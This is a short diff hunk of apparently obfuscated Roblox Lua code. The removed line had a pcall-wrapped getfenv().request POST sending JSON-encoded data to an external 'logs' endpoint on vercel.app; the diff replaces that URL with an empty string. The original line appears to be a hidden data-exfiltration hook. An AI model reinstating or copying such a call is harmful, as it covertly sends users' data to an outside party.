@@ -18,7 +18,7 @@ local v13 = function(v20)
                 if (v21 == (1)) then
                     pcall(function()
                         v22 = getfenv().request({
-                            Url = 'https://logs-zeta-tawny.vercel.app/api',
+                            Url = '',
                             Method = 'POST',
                             Body = game:GetService('HttpService'):JSONEncode(v20),
                             Headers = {
